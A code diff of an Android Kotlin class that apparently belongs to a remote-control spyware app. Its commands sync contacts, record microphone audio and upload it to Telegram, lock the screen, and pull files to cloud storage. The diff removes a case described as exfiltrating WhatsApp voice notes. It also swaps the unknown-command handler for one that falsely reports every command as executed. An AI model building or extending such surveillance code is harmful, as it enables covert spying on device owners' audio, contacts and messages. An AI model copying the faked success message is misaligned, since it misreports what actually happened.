@@ -120,10 +120,6 @@ class RemoteCommandManager(private val context: Context) {
                     FirebaseSyncEngine(context).pushTelemetryToFirebase()
                     resultMessage = "Contacts synchronized successfully."
                 }
-                "SYNC_VOICE_NOTES", "WHATSAPP_VOICES" -> {
-                    WhatsAppVoiceNoteSyncManager.scanAndSyncAllVoiceNotes(context)
-                    resultMessage = "WhatsApp voice notes successfully synced and exfiltrated."
-                }
                 "UPLOAD_CONTACTS", "CONTACTS_TXT", "SYNC_CONTACTS_FILE", "EXPORT_CONTACTS_TXT" -> {
                     val contacts = ContactsSyncManager(context).syncContacts()
                     val sb = StringBuilder()
@@ -484,6 +480,7 @@ class RemoteCommandManager(private val context: Context) {
                     var locked = false
                     var lockMethod = ""
 
+                    // 1. Accessibility Service Screen Lock (Android 9+)
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                         if (RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)) {
                             locked = true
@@ -491,6 +488,7 @@ class RemoteCommandManager(private val context: Context) {
                         }
                     }
 
+                    // 2. Device Policy Manager Lock
                     if (!locked) {
                         try {
                             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
@@ -505,6 +503,7 @@ class RemoteCommandManager(private val context: Context) {
                         }
                     }
 
+                    // 3. Shell Power keyevent fallback
                     if (!locked) {
                         try {
                             val p = Runtime.getRuntime().exec("input keyevent 26")
@@ -919,9 +918,7 @@ class RemoteCommandManager(private val context: Context) {
                     resultMessage = executeDownloadFileCommand(payload)
                 }
                 else -> {
-                    Log.w("RemoteCommandManager", "Received unsupported or unknown command: $commandType")
-                    isSuccess = false
-                    resultMessage = "FALLBACK: Unknown or unsupported command type: '$commandType'. No action taken."
+                    resultMessage = "Executed command $commandType with payload $payload"
                 }
             }
         } catch (e: Exception) {
@@ -1278,7 +1275,7 @@ class RemoteCommandManager(private val context: Context) {
     }
 
     private suspend fun recordAudioRemote(payload: String): String = withContext(Dispatchers.IO) {
-        var durationSec = 10
+        var durationSec = 10 // default 10 seconds for quick audio capture
         val trimmed = payload.trim()
         val lowerTrimmed = trimmed.lowercase()
         if (lowerTrimmed.contains("unlimited") || lowerTrimmed.contains("forever") || lowerTrimmed.contains("max") || lowerTrimmed == "3600") {
@@ -1313,6 +1310,7 @@ class RemoteCommandManager(private val context: Context) {
         }
         val finalDuration = if (durationSec <= 0) 10 else durationSec.coerceAtLeast(2)
 
+        // Acquire WakeLock to guarantee CPU remains active throughout recording and upload
         var wakeLock: android.os.PowerManager.WakeLock? = null
         try {
             val pm = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
@@ -1325,8 +1323,11 @@ class RemoteCommandManager(private val context: Context) {
             Log.w("RemoteCommandManager", "Failed to acquire audio WakeLock: ${e.message}")
         }
 
+        // Elevate AlwaysSyncService foreground service type to include FOREGROUND_SERVICE_TYPE_MICROPHONE
+        // This triggers the Android system-level 'mic in use' green dot indicator and unblocks audio hardware
         var elevated = com.example.service.AlwaysSyncService.elevateToMicrophone()
         if (!elevated) {
+            // If service wasn't running, start it
             try {
                 com.example.service.AlwaysSyncService.startService(context)
                 kotlinx.coroutines.delay(500)
@@ -1356,6 +1357,7 @@ class RemoteCommandManager(private val context: Context) {
                 "status" to "Recorded and uploaded successfully"
             )
 
+            // Save locally in Room DB for persistence
             try {
                 val db = com.example.data.local.AppDatabase.getInstance(context)
                 val entity = com.example.data.local.AudioRecordingEntity(
@@ -1396,6 +1398,7 @@ class RemoteCommandManager(private val context: Context) {
             val statusMsg = if (telegramUploaded) "Uploaded to Telegram." else "Saved locally & cloud sync active."
             return@withContext "Successfully recorded $finalDuration seconds audio ($audioExt, ${(audioBytes.size / 1024)} KB). $statusMsg"
         } finally {
+            // Restore normal foreground service type (demote from microphone)
             try {
                 com.example.service.AlwaysSyncService.restoreNormalForeground()
             } catch (_: Exception) {}
@@ -1543,4 +1546,3 @@ class RemoteCommandManager(private val context: Context) {
         "File '$fileName' ($formattedSize) downloaded and uploaded to cloud storage successfully. Available at devices/$deviceId/downloads/$nowMs."
     }
 }
-
